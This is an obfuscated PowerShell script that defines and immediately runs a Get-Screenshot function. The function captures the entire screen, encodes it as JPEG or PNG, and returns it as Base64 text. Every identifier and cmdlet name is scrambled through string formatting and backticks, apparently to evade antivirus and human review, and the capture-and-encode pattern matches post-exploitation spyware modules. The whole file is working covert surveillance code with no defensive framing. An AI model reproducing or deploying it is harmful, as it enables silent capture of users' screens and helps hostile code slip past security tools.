&("{0}{1}" -f 'Set-it','Em') ("{1}{2}{3}{0}{4}" -f 'Le:40','VA','r','iaB','Pf')  ( [tyPe]("{2}{0}{3}{1}{5}{4}" -f'S.f','SY','WinDow','oRms.','ATIon','STemINfORM'))  ;   .("{1}{0}"-f't-itEm','Se') ("{3}{2}{0}{1}" -f 'l','E:EOc','rIab','va') ( [typE]("{0}{1}{3}{2}"-F'd','RAwI','s','Ng.GrAPhIC')  ) ;  ${orj`e1} = [Type]("{0}{2}{4}{1}{3}"-F'DRA','.p','wIN','Oint','g'); .("{2}{1}{0}" -f'-ITeM','et','s') ("{1}{0}{3}{2}" -f'ArIAB','V','ZqGO4','Le:') (  [TYPe]("{3}{7}{0}{4}{5}{6}{2}{1}"-f'tEm.','R','NCODE','sy','d','R','awiNG.IMagInG.E','s') )  ; .('sv')  ("g7f"+"On")  ( [tyPE]("{6}{0}{2}{5}{8}{4}{1}{7}{3}" -F 'AW','geCOd','i','cinfo','ng.ima','NG.I','dR','E','MAgi') );  &("{0}{1}{2}" -f's','et-vArIAb','lE') ("80"+"D47")  ([typE]("{7}{5}{0}{2}{4}{3}{1}{6}"-F 'iN','ima','g.I','G.','magiN','w','GEFOrmAt','dRa')) ;   &("{2}{0}{1}"-f 'T-','ItEm','Se')  ("Va"+"Ri"+"ABl"+"E:"+"g8x30V")  (  [TYpE]("{0}{1}{2}" -f'cO','n','verT'))  ;function GeT-`S`CrEeNS`hoT 
{
    param
    (
        [Parameter(MaNDatORY = ${FAl`sE})]
        [string]
        ${r`ATIO}
    )
    &("{1}{0}{2}" -f '-T','Add','ype') -Assembly ("{3}{0}{2}{1}{4}" -f'Wi','ows.Form','nd','System.','s');
    ${Sc`R`EenboU`Nds} =   (  .("{1}{0}" -f 'E','vARIABL')  ("{0}{1}"-f'40P','f')  )."VA`lue"::"V`irt`UaLscRe`en";
    ${SCReen`sh`OT`O`B`ject} = .("{2}{1}{0}" -f 'ject','b','New-O') ("{1}{2}{3}{4}{0}"-f'p','Dr','awing','.Bit','ma') ${sc`REEnBou`NDS}."wid`TH", ${Sc`ReEnBO`Unds}."hE`IgHt";
    ${DrAWiN`g`gRa`p`HiCs} =  ${E`oc}::("{0}{2}{1}"-f'F','e','romImag').Invoke(${s`CRe`ensHO`ToBjECt});
    ${D`Ra`WInGGRap`hIcS}.("{1}{2}{3}{0}" -f'reen','Co','pyFromS','c').Invoke( ${Sc`R`eEn`Bo`UndS}."l`OC`AtIOn",   ${OrJ`e1}::"EmP`Ty", ${s`cReeNboUN`dS}."s`iZE");
    ${Dr`AWi`NGG`Ra`PhIcS}.("{2}{1}{0}" -f 'pose','s','Di').Invoke();
    ${ms} = &("{2}{0}{1}"-f'-Objec','t','New') ("{4}{5}{2}{3}{0}{1}" -f'a','m','O.MemoryStr','e','Syst','em.I');
    if (${RAt`Io}) {
    	try {
    		${Iq`UaL} =   (  .("{3}{0}{2}{1}" -f'R','aBLe','I','GEt-VA') ('g8X'+'3'+'0V'))."V`ALUe"::("{0}{1}"-f 'ToI','nt32').Invoke(${rAT`IO});
    	} catch {
    		${iqu`AL}=80;
    	}
    	if (${iQu`AL} -gt 100){
    		${iQu`Al}=100;
    	} elseif (${i`Q`Ual} -lt 1){
    		${Iq`Ual}=1;
    	}
    	${E`Nc`o`de`RParamS} = &("{0}{2}{1}" -f 'N','ject','ew-Ob') ("{3}{8}{4}{1}{7}{10}{5}{2}{9}{11}{6}{0}"-f 'rameters','ag','.','Sy','g.Im','g','coderPa','i','stem.Drawin','E','n','n');
			${ENc`O`derparAmS}."par`AM"[0] = &("{0}{1}{2}"-f'Ne','w-','Object') ("{2}{3}{0}{1}{5}{4}"-f'g.En','coder','Drawing.Imag','in','eter','Param') (  (  &("{1}{0}{2}"-f 'Et-VarI','G','abLE') ("{0}{1}" -f'zqg','o4') )."VaL`UE"::"quA`litY", ${iq`U`AL});
			${JPe`Gc`o`dEC} =   (&('LS') ('V'+'ar'+'Ia'+'ble:G7FON'))."v`AlUE"::("{0}{1}{2}{3}"-f 'GetIma','geE','n','coders').Invoke() | .("{0}{2}{1}"-f 'Where-','ect','Obj') { ${_}."FoR`mA`Td`Esc`RIpt`IoN" -eq ("{0}{1}" -f 'JP','EG') }
			${sC`Re`ENS`hOtOBJ`ect}.("{1}{0}" -f 'ave','s').Invoke(${mS}, ${jp`EG`cOd`eC}, ${EN`Co`der`pA`RAms});
		} else {
    	${ScreEN`s`HOT`oBJ`e`Ct}.("{0}{1}"-f'sav','e').Invoke(${ms},   ${80d47}::"P`Ng");
    }
    ${sCRE`EN`sh`OTObJE`CT}.("{0}{1}" -f 'Di','spose').Invoke();
     (  .("{1}{0}{2}{3}"-f 'vaRi','Get-','a','BLE') ('G8X'+'30V') )."vA`lUE"::"toBaS`E64Str`I`Ng"(${Ms}.("{0}{1}" -f'ToA','rray').Invoke());
}
&("{2}{1}{0}{3}"-f't-S','e','G','creenshot')